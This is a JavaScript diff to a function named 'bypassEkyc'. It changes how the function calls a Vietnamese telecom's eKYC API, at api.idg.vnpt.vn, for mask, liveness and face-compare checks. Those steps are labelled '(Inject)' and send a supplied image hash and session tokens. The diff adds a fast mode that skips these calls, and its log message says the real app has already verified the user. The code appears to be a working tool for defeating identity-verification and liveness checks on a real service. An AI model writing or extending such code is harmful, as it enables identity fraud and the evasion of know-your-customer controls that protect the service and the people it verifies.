@@ -740,35 +740,39 @@ window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
 
         let maskData = {}, livenessData = {}, compareData = {};
 
-        // 6. Mask check (IDG AI)
-        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 6/13: Kiem tra mask (Inject)...';
-        const maskRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/mask?challenge_code=${challengeCode}`, {
-            method: 'POST',
-            headers: idgAIHeaders,
-            body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
-        });
-        maskData = await maskRes.json().catch(() => ({}));
-        console.log('[IDG] mask:', maskRes.status, maskData);
+        if (!fastMode) {
+            // 6. Mask check (IDG AI)
+            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 6/13: Kiem tra mask (Inject)...';
+            const maskRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/mask?challenge_code=${challengeCode}`, {
+                method: 'POST',
+                headers: idgAIHeaders,
+                body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
+            });
+            maskData = await maskRes.json().catch(() => ({}));
+            console.log('[IDG] mask:', maskRes.status, maskData);
 
-        // 7. Liveness check (IDG AI)
-        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 7/13: Kiem tra liveness (Inject)...';
-        const livenessRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/liveness?challenge_code=${challengeCode}`, {
-            method: 'POST',
-            headers: idgAIHeaders,
-            body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
-        });
-        livenessData = await livenessRes.json().catch(() => ({}));
-        console.log('[IDG] liveness:', livenessRes.status, livenessData);
+            // 7. Liveness check (IDG AI)
+            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 7/13: Kiem tra liveness (Inject)...';
+            const livenessRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/liveness?challenge_code=${challengeCode}`, {
+                method: 'POST',
+                headers: idgAIHeaders,
+                body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
+            });
+            livenessData = await livenessRes.json().catch(() => ({}));
+            console.log('[IDG] liveness:', livenessRes.status, livenessData);
 
-        // 8. Compare face (IDG AI)
-        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 8/13: So sanh khuon mat (Inject)...';
-        const compareRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/compare?challenge_code=${challengeCode}`, {
-            method: 'POST',
-            headers: idgAIHeaders,
-            body: JSON.stringify({ img_front: '', step_id: 0, token: bodyToken, img_face: p_image_hash, client_session: clientSession })
-        });
-        compareData = await compareRes.json().catch(() => ({}));
-        console.log('[IDG] compare:', compareRes.status, compareData);
+            // 8. Compare face (IDG AI)
+            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 8/13: So sanh khuon mat (Inject)...';
+            const compareRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/compare?challenge_code=${challengeCode}`, {
+                method: 'POST',
+                headers: idgAIHeaders,
+                body: JSON.stringify({ img_front: '', step_id: 0, token: bodyToken, img_face: p_image_hash, client_session: clientSession })
+            });
+            compareData = await compareRes.json().catch(() => ({}));
+            console.log('[IDG] compare:', compareRes.status, compareData);
+        } else {
+            console.log('⚡ [FAST MODE] Bỏ qua 3 bước gọi API AI (mask, liveness, compare). App VNPT thật đã gọi và xác thực thành công rồi!');
+        }
 
 
         // 9. Log eKYC ket qua AI len ONEBSS
